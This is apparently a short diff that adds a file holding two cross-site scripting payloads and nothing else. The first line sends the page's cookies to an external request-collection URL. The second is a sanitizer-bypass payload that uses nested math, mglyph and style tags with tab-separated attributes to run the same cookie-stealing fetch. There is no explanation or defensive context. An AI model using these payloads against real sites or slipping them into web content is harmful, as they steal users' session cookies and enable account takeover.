@@ -1,0 +1,3 @@
+fetch('https://enkc46tudbjv9.x.pipedream.net/?param='+document[cookie]+'123')
+
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;fetch('https://enkc46tudbjv9.x.pipedream.net/?param='+document.cookie+'123')&gt;">
